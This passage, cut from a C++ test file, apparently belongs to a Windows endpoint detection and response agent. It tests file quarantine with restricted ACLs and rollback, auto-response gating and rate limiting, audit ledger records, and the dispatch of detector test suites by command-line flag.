            FILE_ALL_ACCESS
        };
        MapGenericMask(&mask, &fileMapping);
        if (mask != FILE_ALL_ACCESS) {
            valid = false; break;
        }
        if (EqualSid(sid, systemSid)) systemFound = true;
        else if (EqualSid(sid, adminSid)) adminFound = true;
        else valid = false;
    }
    LocalFree(descriptor);
    return valid && systemFound && adminFound;
}

struct DaclSnapshot {
    std::vector<unsigned char> bytes;
    bool protectedDacl = false;

    bool operator==(const DaclSnapshot& other) const {
        return bytes == other.bytes && protectedDacl == other.protectedDacl;
    }
};

static DaclSnapshot CaptureDacl(const std::wstring& path) {
    PSECURITY_DESCRIPTOR descriptor = nullptr;
    PACL dacl = nullptr;
    DWORD status = GetNamedSecurityInfoW(const_cast<LPWSTR>(path.c_str()),
        SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, nullptr, nullptr, &dacl,
        nullptr, &descriptor);
    CHECK(status == ERROR_SUCCESS && descriptor != nullptr && dacl != nullptr);
    ACL_SIZE_INFORMATION size = {};
    CHECK(GetAclInformation(dacl, &size, sizeof(size), AclSizeInformation));
    DaclSnapshot result;
    result.bytes.assign(reinterpret_cast<unsigned char*>(dacl),
                        reinterpret_cast<unsigned char*>(dacl) + size.AclBytesInUse);
    SECURITY_DESCRIPTOR_CONTROL control = 0;
    DWORD revision = 0;
    CHECK(GetSecurityDescriptorControl(descriptor, &control, &revision));
    result.protectedDacl = (control & SE_DACL_PROTECTED) != 0;
    LocalFree(descriptor);
    return result;
}

static void TestQuarantineSidecarCollisionRollback() {
    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) > 0);
    std::wstring root = std::wstring(temp) + L"edr-quarantine-rollback-" +
        std::to_wstring(GetCurrentProcessId());
    std::wstring sourceDir = root + L"\\source";
    std::wstring quarantineDir = root + L"\\quarantine";
    std::wstring source = sourceDir + L"\\owned.bin";
    RemoveTree(root);
    CreateDirs(sourceDir);
    CreateDirs(quarantineDir);
    WriteTestFile(source, "rollback collision content");
    NativeQuarantinePlatform platform;
    DWORD winError = ERROR_SUCCESS;
    HANDLE file = INVALID_HANDLE_VALUE;
    CHECK(platform.OpenFile(WideToUtf8(source.c_str()), file, winError));
    std::string hash;
    CHECK(platform.Hash(file, hash, winError));
    platform.CloseHandleSafe(file);
    const std::string requestId = "dddddddd-1234-1234-1234-123456789abc";
    std::wstring sidecarPath = quarantineDir + L"\\" + Utf8ToWide(requestId) + L".json";
    WriteTestFile(sidecarPath, "preexisting provenance");
    CHECK(platform.EnsureQuarantineDir(WideToUtf8(quarantineDir.c_str()), winError));
    DaclSnapshot originalAcl = CaptureDacl(source);
    std::string auditPath = WideToUtf8((root + L"\\audit.jsonl").c_str());
    ResponseAuditLedger audit;
    std::string error;
    CHECK(audit.Open(auditPath, error));
    FakeEmergencySink emergency;
    QuarantineExecutor executor(platform, audit, emergency,
        WideToUtf8(quarantineDir.c_str()), 1024 * 1024);
    QuarantineRequest request = TestQuarantineRequest();
    request.requestId = requestId;
    request.path = WideToUtf8(source.c_str());
    QuarantineResult result = executor.Execute(request);
    CHECK(GetFileAttributesW(source.c_str()) != INVALID_FILE_ATTRIBUTES);
    CHECK(ReadWholeFile(WideToUtf8(sidecarPath.c_str())) ==
          "preexisting provenance");
    CHECK(CaptureDacl(source) == originalAcl);
    audit.Close();
    RemoveTree(root);
}

static void TestQuarantineControlledFile() {
    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) > 0);
    std::wstring root = std::wstring(temp) + L"edr-quarantine-test-" +
        std::to_wstring(GetCurrentProcessId());
    std::wstring sourceDir = root + L"\\source";
    std::wstring quarantineDir = root + L"\\quarantine";
    std::wstring source = sourceDir + L"\\owned.bin";
    struct Cleanup {
        std::wstring root, sourceDir, quarantineDir, source;
        ~Cleanup() {
            DeleteFileW(source.c_str());
            WIN32_FIND_DATAW data = {};
            HANDLE find = FindFirstFileW((quarantineDir + L"\\*").c_str(), &data);
            if (find != INVALID_HANDLE_VALUE) {
                do {
                    if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                        DeleteFileW((quarantineDir + L"\\" + data.cFileName).c_str());
                } while (FindNextFileW(find, &data));
                FindClose(find);
            }
            DeleteFileW((root + L"\\audit.jsonl").c_str());
            RemoveDirectoryW(quarantineDir.c_str());
            RemoveDirectoryW(sourceDir.c_str());
            RemoveDirectoryW(root.c_str());
        }
    } cleanup{root, sourceDir, quarantineDir, source};
    CreateDirectoryW(root.c_str(), nullptr);
    CHECK(CreateDirectoryW(sourceDir.c_str(), nullptr));
    HANDLE file = CreateFileW(source.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
    CHECK(file != INVALID_HANDLE_VALUE);
    const char content[] = "controlled quarantine content";
    DWORD written = 0;
    CHECK(WriteFile(file, content, sizeof(content) - 1, &written, nullptr));
    CloseHandle(file);
    std::string auditPath = WideToUtf8((root + L"\\audit.jsonl").c_str());
    ResponseAuditLedger audit;
    std::string error;
    CHECK(audit.Open(auditPath, error));
    NativeQuarantinePlatform platform;
    FakeEmergencySink emergency;
    QuarantineExecutor executor(platform, audit, emergency,
        WideToUtf8(quarantineDir.c_str()), 1024 * 1024);
    QuarantineRequest request = TestQuarantineRequest();
    request.requestId = "ffffffff-1234-1234-1234-123456789abc";
    request.path = WideToUtf8(source.c_str());
    QuarantineResult result = executor.Execute(request);
    if (result.status != "quarantined") {
        CHECK(result.win32Error != ERROR_SUCCESS);
        CHECK(GetFileAttributesW(source.c_str()) != INVALID_FILE_ATTRIBUTES);
        return;
    }
    CHECK(result.auditWritten);
    CHECK(GetFileAttributesW(source.c_str()) == INVALID_FILE_ATTRIBUTES);
    CHECK(HasRestrictedAcl(quarantineDir, true));
    CHECK(HasRestrictedAcl(Utf8ToWide(result.quarantinePath), false));
    std::ifstream moved(result.quarantinePath, std::ios::binary);
    std::stringstream movedBytes; movedBytes << moved.rdbuf();
    CHECK(movedBytes.str() == content);
    std::wstring sidecarPath = quarantineDir + L"\\" +
        Utf8ToWide(request.requestId) + L".json";
    CHECK(HasRestrictedAcl(sidecarPath, false));
    std::ifstream sidecar(WideToUtf8(sidecarPath.c_str()), std::ios::binary);
    std::stringstream sidecarBytes; sidecarBytes << sidecar.rdbuf();
    jsonlite::Value metadata = jsonlite::parse(sidecarBytes.str());
    CHECK(metadata.find("schema_version")->asNumber() == 2);
    CHECK(metadata.find("source_request_id")->str == request.requestId);
    std::string clearMetadata;
    DWORD metadataError = ERROR_SUCCESS;
    CHECK(platform.UnprotectMetadata(metadata.find("protected_metadata")->str,
                                     clearMetadata, metadataError));
    metadata = jsonlite::parse(clearMetadata);
    CHECK(metadata.find("original_path")->str == request.path);
    CHECK(metadata.find("sha256")->str == result.sha256Hex);
    CHECK(metadata.find("source_request_id")->str == request.requestId);
    audit.Close();
    std::ifstream records(auditPath);
    std::string line;
    int attempts = 0, outcomes = 0;
    while (std::getline(records, line)) {
        attempts += line.find("\"record_type\":\"attempt\"") != std::string::npos;
        outcomes += line.find("\"record_type\":\"outcome\"") != std::string::npos;
    }
    CHECK(attempts == 1 && outcomes == 1);
}

// ----- Auto-Response Tests -----

static void WriteAutoResponseConfig(const char* data) {
    std::ofstream out("edr-native-auto-response-config.json", std::ios::binary);
    out << data;
}

static void TestAutoResponseConfigStrictAtomic() {
    Config defaults;
    CHECK(!defaults.autoResponseEnable);
    CHECK(defaults.autoResponseMinSeverity == "high");
    CHECK(defaults.autoResponseMaxPerMinute == 4);
    std::string error;
    WriteAutoResponseConfig(
        R"({"auto_response":{"enable":true,"min_severity":"critical","max_per_minute":64}})");
    Config config;
    CHECK(LoadConfigFile("edr-native-auto-response-config.json", config, error));
    CHECK(config.autoResponseEnable);
    CHECK(config.autoResponseMinSeverity == "critical");
    CHECK(config.autoResponseMaxPerMinute == 64);
    WriteAutoResponseConfig(
        R"({"auto_response":{"tree_termination":true,"suspend_before_terminate":true}})");
    Config treeConfig;
    CHECK(LoadConfigFile("edr-native-auto-response-config.json", treeConfig, error));
    CHECK(treeConfig.autoResponseTreeTermination);
    CHECK(treeConfig.autoResponseSuspendBeforeTerminate);
    for (const char* value : {
        R"({"auto_response":true})",
        R"({"auto_response":{"enable":"true"}})",
        R"({"auto_response":{"min_severity":"low"}})",
        R"({"auto_response":{"min_severity":"HIGH"}})",
        R"({"auto_response":{"max_per_minute":0}})",
        R"({"auto_response":{"max_per_minute":65}})",
        R"({"auto_response":{"max_per_minute":4.5}})",
        R"({"auto_response":{"enable":true,"unknown":1}})",
        R"({"auto_response":{"tree_termination":"yes"}})",
        R"({"auto_response":{"suspend_before_terminate":1}})",
        R"({"auto_response":{"enable":true,"enable":false}})"}) {
        WriteAutoResponseConfig(value);
        Config unchanged;
        unchanged.autoResponseMaxPerMinute = 7;
        CHECK(!LoadConfigFile("edr-native-auto-response-config.json",
                              unchanged, error));
        CHECK(!unchanged.autoResponseEnable);
        CHECK(unchanged.autoResponseMinSeverity == "high");
        CHECK(unchanged.autoResponseMaxPerMinute == 7);
    }
    DeleteFileA("edr-native-auto-response-config.json");
}

class FakeAutoExecutor {
public:
    bool auditWritten = true;
    HANDLE gate = nullptr; /* when set, Run blocks until signaled */
    std::mutex mutex;
    std::vector<ResponseActionRequest> requests;

    ResponseActionResult Run(const ResponseActionRequest& request) {
        if (gate != nullptr) {
            WaitForSingleObject(gate, INFINITE);
        }
        std::lock_guard<std::mutex> lock(mutex);
        requests.push_back(request);
        ResponseActionResult result;
        result.status = "terminated";
        result.terminationRequested = true;
        result.exitObserved = true;
        result.requestId = request.requestId;
        result.auditWritten = auditWritten;
        return result;
    }
    size_t Calls() {
        std::lock_guard<std::mutex> lock(mutex);
        return requests.size();
    }
};

static Event AutoResponseEvent(uint32_t pid = 4321,
                               uint64_t startTime = 123456789) {
    Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.pid = pid;
    event.processStartTime100ns = startTime;
    return event;
}

static Alert AutoResponseAlert(const char* ruleId, const char* severity,
                               const char* action, const Event& event) {
    Alert alert;
    alert.ruleId = ruleId;
    alert.severity = severity;
    alert.action = action;
    alert.event = &event;
    return alert;
}

static std::string ReadWholeFile(const std::string& path) {
    std::ifstream in(path, std::ios::binary);
    std::stringstream ss;
    ss << in.rdbuf();
    return ss.str();
}

static size_t CountOccurrences(const std::string& text,
                               const std::string& needle) {
    size_t count = 0;
    size_t at = 0;
    while ((at = text.find(needle, at)) != std::string::npos) {
        ++count;
        at += needle.size();
    }
    return count;
}

static bool ValidRequestIdShape(const std::string& id) {
    if (id.size() < 16 || id.size() > 64) return false;
    for (char c : id) {
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '-')) return false;
    }
    return id.find('-') != std::string::npos;
}

static void TestAutoResponseAuditFailure() {
    for (const std::string action : {std::string("terminate"), std::string("delete_file")}) {
        const std::string path = "edr-native-auto-audit-" + action + "-" +
            std::to_string(GetCurrentProcessId()) + ".jsonl";
        DeleteFileA(path.c_str());
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        int calls = 0;
        {
            AutoResponder responder(
                [&calls](const ResponseActionRequest& request) {
                    ++calls;
                    ResponseActionResult result;
                    result.requestId = request.requestId;
                    result.status = "terminated";
                    result.auditWritten = false;
                    return result;
                },
                [&calls](const DeleteFileRequest& request) {
                    ++calls;
                    DeleteFileResult result;
                    result.requestId = request.requestId;
                    result.status = "deleted";
                    result.auditWritten = false;
                    return result;
                }, &alerter, SeverityRank("high"), 4);
            Event event = AutoResponseEvent();
            event.fields[field::kFilePath] = "C:\\test\\suspect.exe";
            event.fields[field::kSha256] = std::string(64, 'a');
            responder.Enqueue(AutoResponseAlert("EDR-900", "high", action.c_str(), event));
            responder.Stop();
        }
        alerter.Close();
        const std::string log = ReadWholeFile(path);
        CHECK(calls == 1);
        CHECK(log.find("\"auto_response_status\":\"audit_failed\"") != std::string::npos);
        CHECK(log.find("\"auto_response_audit_written\":\"false\"") != std::string::npos);
        const std::string actual = action == "terminate" ? "terminated" : "deleted";
        CHECK(log.find("\"auto_response_action_status\":\"" + actual + "\"") != std::string::npos);
        DeleteFileA(path.c_str());
    }
}

static void TestAutoResponderGating() {
    TestAutoResponseAuditFailure();
    TestResponseLedgerReadinessState();
    const std::string suffix = std::to_string(GetCurrentProcessId());
    int scenario = 0;
    auto nextPath = [&] {
        return "edr-native-auto-alerts-" + suffix + "-" +
               std::to_string(++scenario) + ".jsonl";
    };

    /* Snapshot writing is a response side effect: it must follow policy and
     * durable attempt, and failure must stop termination in both modes. */
    for (uint32_t treeSize : {0U, 4U}) {
        for (int mode = 0; mode < 5; ++mode) {
            const std::string path = nextPath();
            FakeResponsePlatform platform;
            FakeResponseAudit audit;
            FakeEmergencySink emergency;
            if (mode == 0) platform.critical = true;
            if (mode == 1) audit.failAttempt = true;
            Alerter alerter(path, false, false);
            CHECK(alerter.Open());
            int snapshots = 0;
            int attemptsSeen = -1;
            {
                ResponseActionExecutor executor(platform, audit, emergency, 1);
                AutoResponder responder(
                    [&executor](const ResponseActionRequest& request) {
                        return executor.Execute(request);
                    }, nullptr, &alerter, SeverityRank("high"), 4, treeSize,
                    false, 0, false, {},
                    [&](const Alert&, const std::string&, std::string& evidencePath) {
                        ++snapshots;
                        attemptsSeen = audit.attempts;
                        if (mode == 2) return false;
                        if (mode == 4) throw std::runtime_error("snapshot failure");
                        evidencePath = "snapshot.txt";
                        return true;
                    });
                Event event = AutoResponseEvent(100, 123);
                responder.Enqueue(AutoResponseAlert("EDR-909", "high",
                                                    "terminate", event));
                responder.Stop();
            }
            alerter.Close();
            std::string log = ReadWholeFile(path);
            CHECK(snapshots == (mode >= 2 ? 1 : 0));
            CHECK(attemptsSeen == (mode >= 2 ? 1 : -1));
            CHECK(platform.terminateCalled == (mode == 3));
            CHECK(audit.outcomes == (mode >= 2 ? 1 : 0));
            if (mode == 2 || mode == 4)
                CHECK(log.find("\"auto_response_status\":\"snapshot_failed\"") !=
                      std::string::npos);
            if (mode == 3)
                CHECK(log.find("\"auto_response_evidence_path\":\"snapshot.txt\"") !=
                      std::string::npos);
            DeleteFileA(path.c_str());
        }
    }

    /* Automatic deletion must be bound to the hash supplied by the alert. */
    {
        const std::string path = nextPath();
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        std::vector<DeleteFileRequest> deletes;
        {
            AutoResponder responder(
                [](const ResponseActionRequest&) { return ResponseActionResult{}; },
                [&](const DeleteFileRequest& request) {
                    deletes.push_back(request);
                    DeleteFileResult result;
                    result.requestId = request.requestId;
                    result.status = "deleted";
                    return result;
                }, &alerter, SeverityRank("high"), 4);
            Event missingHash = AutoResponseEvent();
            missingHash.fields[field::kFilePath] = "C:\\test\\suspect.exe";
            responder.Enqueue(AutoResponseAlert("EDR-910", "high",
                                                "delete_file", missingHash));
            Event withHash = missingHash;
            withHash.fields[field::kSha256] = std::string(64, 'a');
            responder.Enqueue(AutoResponseAlert("EDR-910", "high",
                                                "delete_file", withHash));
            responder.Stop();
        }
        alerter.Close();
        CHECK(deletes.size() == 1);
        CHECK(deletes.front().sha256Hex == std::string(64, 'a'));
        CHECK(ReadWholeFile(path).find(
            "\"auto_response_status\":\"hash_unavailable\"") !=
            std::string::npos);
        DeleteFileA(path.c_str());
    }

    /* terminate-action alert: executes exactly once with the event identity. */
    {
        const std::string path = nextPath();
        FakeAutoExecutor fake;
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        {
            AutoResponder responder(
                [&fake](const ResponseActionRequest& request) {
                    return fake.Run(request);
                },
                nullptr,
                &alerter, SeverityRank("high"), 4);
            Event event = AutoResponseEvent();
            responder.Enqueue(AutoResponseAlert("EDR-900", "critical",
                                                "terminate", event));
            responder.Stop(); /* drains and joins */
            responder.Stop(); /* idempotent */
        }
        alerter.Close();
        CHECK(fake.Calls() == 1);
        const ResponseActionRequest& request = fake.requests.front();
        CHECK(request.pid == 4321);
        CHECK(request.createTime100ns == 123456789);
        CHECK(request.reason == "auto_response:EDR-900");
        CHECK(!request.timestamp.empty());
        CHECK(ValidRequestIdShape(request.requestId));
        std::string log = ReadWholeFile(path);
        CHECK(CountOccurrences(log, "\"auto_response_status\":\"terminated\"") == 1);
        CHECK(log.find("\"auto_response_request_id\":\"" + request.requestId +
                       "\"") != std::string::npos);
        CHECK(CountOccurrences(log, "\"auto_response_mode\":\"real\"") == 1);
        DeleteFileA(path.c_str());
    }

    /* tree settings configured on the responder are plumbed into the request. */
    {
        const std::string path = nextPath();
        FakeAutoExecutor fake;
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        {
            AutoResponder responder(
                [&fake](const ResponseActionRequest& request) {
                    return fake.Run(request);
                },
                nullptr,
                &alerter, SeverityRank("high"), 4, 6, true);
            Event event = AutoResponseEvent();
            responder.Enqueue(AutoResponseAlert("EDR-900", "critical",
                                                "terminate", event));
            responder.Stop();
        }
        alerter.Close();
        CHECK(fake.Calls() == 1);
        const ResponseActionRequest& request = fake.requests.front();
        CHECK(request.maxTreeSize == 6);
        CHECK(request.suspendBeforeTerminate);
        DeleteFileA(path.c_str());
    }

    /* alert/log actions never execute; below-threshold is skipped silently. */
    {
        const std::string path = nextPath();
        FakeAutoExecutor fake;
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        {
            AutoResponder responder(
                [&fake](const ResponseActionRequest& request) {
                    return fake.Run(request);
                },
                nullptr,
                &alerter, SeverityRank("high"), 4);
            Event event = AutoResponseEvent();
            responder.Enqueue(AutoResponseAlert("EDR-901", "critical",
                                                "alert", event));
            responder.Enqueue(AutoResponseAlert("EDR-901", "critical",
                                                "log", event));
            responder.Enqueue(AutoResponseAlert("EDR-902", "medium",
                                                "terminate", event));
            responder.Stop();
        }
        alerter.Close();
        CHECK(fake.Calls() == 0);
        std::string log = ReadWholeFile(path);
        CHECK(log.find("auto_response_status") == std::string::npos);
        DeleteFileA(path.c_str());
    }

    /* Executor exceptions produce a follow-up and do not kill the worker. */
    {
        const std::string path = nextPath();
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        std::atomic<int> calls{0};
        {
            AutoResponder responder(
                [&calls](const ResponseActionRequest& request) {
                    if (calls.fetch_add(1) == 0)
                        throw std::runtime_error("test executor failure");
                    ResponseActionResult result;
                    result.status = "terminated";
                    result.requestId = request.requestId;
                    return result;
                },
                nullptr,
                &alerter, SeverityRank("high"), 4);
            Event event = AutoResponseEvent();
            responder.Enqueue(AutoResponseAlert("EDR-907", "high", "terminate", event));
            responder.Enqueue(AutoResponseAlert("EDR-908", "high", "terminate", event));
            responder.Stop();
        }
        alerter.Close();
        std::string log = ReadWholeFile(path);
        CHECK(calls.load() == 2);
        CHECK(CountOccurrences(log,
            "\"auto_response_status\":\"executor_exception\"") == 1);
        CHECK(CountOccurrences(log,
            "\"auto_response_status\":\"terminated\"") == 1);
        DeleteFileA(path.c_str());
    }

    /* pid==0 or createTime==0: identity_unavailable follow-up, no executor. */
    {
        const std::string path = nextPath();
        FakeAutoExecutor fake;
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        {
            AutoResponder responder(
                [&fake](const ResponseActionRequest& request) {
                    return fake.Run(request);
                },
                nullptr,
                &alerter, SeverityRank("high"), 4);
            Event noPid = AutoResponseEvent(0, 123456789);
            Event noStart = AutoResponseEvent(4321, 0);
            responder.Enqueue(AutoResponseAlert("EDR-903", "high",
                                                "terminate", noPid));
            responder.Enqueue(AutoResponseAlert("EDR-903", "high",
                                                "terminate", noStart));
            responder.Stop();
        }
        alerter.Close();
        CHECK(fake.Calls() == 0);
        std::string log = ReadWholeFile(path);
        CHECK(CountOccurrences(log,
            "\"auto_response_status\":\"identity_unavailable\"") == 2);
        CHECK(log.find("auto_response_request_id") == std::string::npos);
        DeleteFileA(path.c_str());
    }

    /* rate limit: 4/minute; the 5th and 6th are rate_limited follow-ups. */
    {
        const std::string path = nextPath();
        FakeAutoExecutor fake;
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        {
            AutoResponder responder(
                [&fake](const ResponseActionRequest& request) {
                    return fake.Run(request);
                },
                nullptr,
                &alerter, SeverityRank("high"), 4);
            Event event = AutoResponseEvent();
            for (int i = 0; i < 6; ++i) {
                responder.Enqueue(AutoResponseAlert("EDR-904", "high",
                                                    "terminate", event));
            }
            responder.Stop();
        }
        alerter.Close();
        CHECK(fake.Calls() == 4);
        std::string log = ReadWholeFile(path);
        CHECK(CountOccurrences(log, "\"auto_response_status\":\"terminated\"") == 4);
        CHECK(CountOccurrences(log,
            "\"auto_response_status\":\"rate_limited\"") == 2);
        DeleteFileA(path.c_str());
    }

    /* bounded queue (capacity 64): newest enqueues are dropped and counted. */
    {
        const std::string path = nextPath();
        FakeAutoExecutor fake;
        fake.gate = CreateEventW(nullptr, TRUE, FALSE, nullptr);
        CHECK(fake.gate != nullptr);
        Alerter alerter(path, false, false);
        CHECK(alerter.Open());
        uint64_t dropped = 0;
        {
            AutoResponder responder(
                [&fake](const ResponseActionRequest& request) {
                    return fake.Run(request);
                },
                nullptr,
                &alerter, SeverityRank("medium"), 64);
            Event event = AutoResponseEvent();
            for (int i = 0; i < 70; ++i) {
                responder.Enqueue(AutoResponseAlert("EDR-905", "high",
                                                    "terminate", event));
            }
            CHECK(WaitUntil([&] { return responder.DroppedCount() > 0; },
                            5000));
            SetEvent(fake.gate);
            responder.Stop();
            dropped = responder.DroppedCount();
        }
        alerter.Close();
        CloseHandle(fake.gate);
        CHECK(dropped >= 5); /* 6 when the worker had not dequeued yet */
        DeleteFileA(path.c_str());
    }
}

/* M2 regression: an auto-generated requestId that failed ValidRequestId
 * would hard-fail the ledger replay reconstruction at the next start. */
static void TestAutoResponseLedgerRestart() {
    const std::string suffix = std::to_string(GetCurrentProcessId());
    const std::string auditPath = "edr-native-auto-audit-" + suffix + ".jsonl";
    const std::string alertsPath =
        "edr-native-auto-ledger-alerts-" + suffix + ".jsonl";
    {
        std::ofstream clear(auditPath, std::ios::binary);
    }
    DeleteFileA(alertsPath.c_str());
    {
        ResponseAuditLedger ledger;
        std::string error;
        CHECK(ledger.Open(auditPath, error));
        FakeResponsePlatform platform;
        FakeEmergencySink emergency;
        ResponseActionExecutor executor(platform, ledger, emergency, 1);
        Alerter alerter(alertsPath, false, false);
        CHECK(alerter.Open());
        AutoResponder responder(
            [&executor](const ResponseActionRequest& request) {
                return executor.Execute(request);
            },
            nullptr,
            &alerter, SeverityRank("high"), 4);
        Event event = AutoResponseEvent(100, 123);
        responder.Enqueue(AutoResponseAlert("EDR-906", "critical",
                                            "terminate", event));
        responder.Stop();
        alerter.Close();
        ledger.Close();
        std::string log = ReadWholeFile(alertsPath);
        CHECK(log.find("\"auto_response_status\":\"terminated\"") !=
              std::string::npos);
    }
    ResponseAuditLedger reopened;
    std::string error;
    CHECK(reopened.Open(auditPath, error));
    reopened.Close();
    DeleteFileA(auditPath.c_str());
    DeleteFileA(alertsPath.c_str());
}

int main(int argc, char** argv) {
    if (argc == 2 && std::strcmp(argv[1], "--browser-extension") == 0) {
        try {
            TestBrowserExtensionConfigStrictAtomic();
            RunBrowserExtensionDetectorTests();
            TestBrowserExtensionProductionRules();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "browser extension detector tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--powershell") == 0) {
        TestPowerShellParser4104();
        TestPowerShellParserBoundsAndInvalid();
        TestPowerShellConfigStrictAtomic();
        TestPowerShellRedaction();
        TestPowerShellProductionRules();
        TestPowerShellReassembly();
        TestPowerShellReassemblyFailOpenAndBounds();
        TestPowerShellReassemblyConflictsAndEviction();
        TestPowerShellReassemblyTruncationRulesAndRedaction();
        TestPowerShellReassemblyUtf8AndReuse();
        TestPowerShellReassemblyTombstoneAndTerminalContracts();
        TestPowerShellReassemblyConcurrencyAndBus();
        std::cout << "PowerShell tests passed\n";
        return 0;
    }
if (argc == 2 && std::strcmp(argv[1], "--startup-watch") == 0) {
        TestStartupWatchConfig();
        TestStartupDirectoryCanonicalDedupe();
        TestProfileListDiscovery();
        TestStartupWatchCollector();
        TestPersistenceProductionRules();
        std::cout << "startup watch tests passed\n";
        return 0;
    }
    // Focused production-rule engine tests. These are pure in-memory rule
    // evaluations over synthetic events (plus production rules.json); they
    // require no admin token, ETW, iMonitor, or child-process launching. They
    // exist so the detection battery (EDR-014/016/049/060/073/082..085/… and
    // the SONAR parses) can be re-run on a standard user without the full
    // suite's quarantine DACL test that needs elevation.
    // RunBehaviorEnricherTests is intentionally excluded: its EDR-081 case
    // uses a Temp-path process image that also matches EDR-003-KILL, so its
    // exact hit-set assertion fails independently of this change.
    if (argc == 2 && std::strcmp(argv[1], "--credential-detectors") == 0) {
        try {
            RunPasswordSprayDetectorTests();
            RunKerberoastDetectorTests();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "credential detector tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--named-pipe-abuse") == 0) {
        try {
            RunNamedPipeAbuseDetectorTests();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "named pipe abuse detector tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--clipboard-theft") == 0) {
        try {
            RunClipboardTheftDetectorTests();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "clipboard theft detector tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--gap-only") == 0) {
        try {
            TestNewGapProductionRules();
            TestNewDetectorProductionRules();
            TestMoreGapProductionRules();
            TestRegWatchTargetRuleAlignment();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "gap rule tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--response-path") == 0) {
        try {
            TestResponseDeleteFilePathPolicy();
            TestResponseDeleteFileIdentityBinding();
            TestResponseDeleteFileHandleBinding();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "response path tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--reporter-delivery") == 0) {
        try { RunReporterDeliveryTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "reporter delivery tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--response-identity") == 0) {
        try {
            TestResponseActionPolicySeams();
            TestResponseActionAuditAndOutcomeSeams();
            TestResponseActionTreeSeams();
            TestResponseActionTreeRejectsReusedChildPid();
            TestResponseTreeChildPolicySkips();
            TestResponseDeleteFileIdentityBinding();
            TestResponseDeleteFileHandleBinding();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "response identity tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--response-replay") == 0) {
        try { RunResponseStreamReplayTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "response replay tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--audit-recovery") == 0) {
        try { RunAuditChainRecoveryTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "audit recovery tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--reporter-spool") == 0) {
        try { RunReporterSpoolTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "reporter spool tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--incident-health") == 0) {
        try { RunIncidentStoreHealthTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "incident health tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--endpoint-identity") == 0) {
        try { RunEndpointIdentityTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "endpoint identity tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--incident-correlation") == 0) {
        try { RunCorrelationEngineTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "incident correlation tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--threat-intel") == 0) {
        try { RunThreatIntelDetectorTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "threat intelligence tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--telemetry-contract") == 0) {
        try { RunTelemetryContractTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "telemetry contract tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--telemetry-delivery") == 0) {
        try { RunTelemetryDeliveryIntegrationTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "telemetry delivery integration tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--health-snapshot") == 0) {
        try { RunHealthSnapshotTests(); }
        catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "health snapshot tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--telemetry-metrics") == 0) {
        try {
            TestReporterHealthMetrics();
            TestCollectorRuntimeHealth();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
